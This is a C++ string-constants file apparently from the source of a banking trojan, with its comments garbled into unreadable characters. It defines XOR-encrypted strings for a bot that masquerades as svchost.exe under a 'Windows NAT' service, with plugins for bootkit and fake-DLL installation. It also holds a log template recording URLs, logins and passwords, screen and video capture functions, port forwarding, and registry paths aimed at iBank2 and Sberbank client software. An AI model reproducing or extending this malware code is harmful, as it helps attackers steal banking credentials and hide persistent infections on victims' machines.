//---------------------------------------------------------------------------

#pragma hdrstop

#include "StrConsts.h"
#include "Config.h"
#include "Crypt.h"
#include "Crypt.h"

#include "Modules.h"

//---------------------------------------------------------------------------


extern CSSTR BeginCryptBlock[];
extern CSSTR EndCryptBlock[];



//*****************************************************
// GetStr - ������� �������������� ������ EncryptedStr
//*****************************************************
string GetStr(const char* EncryptedStr)
{
	string Result = EncryptedStr;

	bool Encrypted = !Result.IsEmpty() && EncryptedStr > BeginCryptBlock &&
					 EncryptedStr < EndCryptBlock && EncryptedStr[0] != 'C' &&
					 BeginCryptBlock[0] != 'C';

	if (Encrypted)
	{
		// �������������� ������
		XORCrypt::Crypt(GetSessionPassword(), (LPBYTE)Result.t_str(), Result.Length());
	}

	return Result;
}
//-----------------------------------------------------------------------------



//==================================================//
CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
//=============================================================================
//  ���� �������� ����������� �����.
//  ��� ������ ����������� ���� � �� �����������
//  CSEND
//  ����� ����������� ��������
//=============================================================================


CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // ������� ����������� �������� ����������������, ��� ��� �������
CSSTR StrBootkitIsRunMutex[] = "BIR737JK3LJ"; //������� ���������������, ��� ������� ��� �� ��� �������


// ������������ ��� ��� ����� ����
CSSTR EStrOriginalBotExeName[] = "WtJoeBt.exe";

// �������������� �������
CSSTR EStrBotServiceExePath[] = "com\\";

// ��� ��� ����� ������� ����
CSSTR EStrBotServiceExeName[] = "svchost.exe";


// ��� �������
CSSTR EStrServiceName[] = "Windows NAT";


// ������� ���������� � �����
CSSTR StrBotWorkPath[] = "WnsBMT"; // ������� ������� ����
CSSTR StrGrabberPath[] = "gdata";  // ��� ������� ����� �������


// ����� ��������� ������
CSSTR EStrPipeLoader[] = "ldrspp"; // ��� ���������� ����� �������



// ��������� �������, ������������ ����� ����� ���������
CSSTR EStrProcessCommandDeleteBot[] = "delbt";  // ������� �� �������� exe ����

// ����� ��������� �����
CSSTR EStrPrefixFileName[] = "mnprsdd.dat"; // ���� �������� ��������


// ��� ������� ���� � ���� ���
CSSTR EStrBotPlug[] = "bot.plug";

// ��� ���������� �������
CSSTR EStrBootkitInstaller[] = "bki.plug";

// ��� ����������� �������
CSSTR EStrFakeDllInstaller[] = "fdi.plug";



// �������� ������, ������� ����� �������� ���
CSSTR EStrCommandInstallFakeDLL[] = "installfd";  // ������� �� ���������� �������
CSSTR EStrCommandInstallBootkit[] = "installbk";  // ������� �� ���������� �������


// ����� ������, ��� ���������� � ���
CSSTR StrLogFileScreenShot[]  = "Screen.png";
CSSTR StrLogFileInformation[] = "Info.txt";
CSSTR StrLogFileNetInfo[]     = "NetInfo.txt";


// ����� ������� ���������� �����������.
CSSTR VideRecFuncRecordProcess[]  = "StartRecPid";
CSSTR VideRecFuncRecordWnd[]      = "StartRecHwnd";
CSSTR VideRecFuncStop[]           = "StopRec";
CSSTR VideRecFuncResetTimer[]     = "ResetTimer";
CSSTR VideRecFuncSendData[]       = "StartSend";
CSSTR VideRecFuncRunPortForward[] = "RunPortForward";


CSSTR HTTPFormContentDisposition[] = "Content-Disposition: form-data; ";
CSSTR HTTPFormFieldName[]          = "name=\"%s\"";
CSSTR HTTPFormFileInfo[]           = "; filename=\"%s\"\r\nContent-Type: %s\r\nContent-Transfer-Encoding: binary";
CSSTR HTTPOctetStream[]            = "application/octet-stream";





// ������ ������ AzConfig
#ifdef AzConfigH
	CSSTR AzConfigParamUserName[] = "%az_user%";
#endif


// ������ ������ BSS �������
#ifdef BSSH
	CSSTR BSSLogTemplate[] = "Url: %s\r\n\r\n"
							 "Login:    %s\r\n"
							 "Password: %s\r\n\r\n"
							 "UserAgent: %s\r\n";
#endif



#ifdef FakeDllInstallerH
	CSSTR EStrIBankRegistryPath[] = "SOFTWARE\\Classes\\Installer\\Products\\7B00DF09E169B5445AD2F176D624114\\";
	CSSTR EStrSberRegistryKey[]   = "SBRF\\";
	CSSTR EStrIBankFileName[]     = ".iBank2"; // ��� ����� ��� ����������� �������� ����� ����������� Fake DLL
#endif



//=============================================================================
// ����� ����� ����������� �����
//=============================================================================
CSSTR EndCryptBlock[] = ENCRYPTED_STRINGS_END; //
//=============================================//





//-----------------------------------------------------------------------------
// �� ����������� ������
//-----------------------------------------------------------------------------

CSSTR Slash[]   = "\\";
CSSTR SlashChar = '\\';
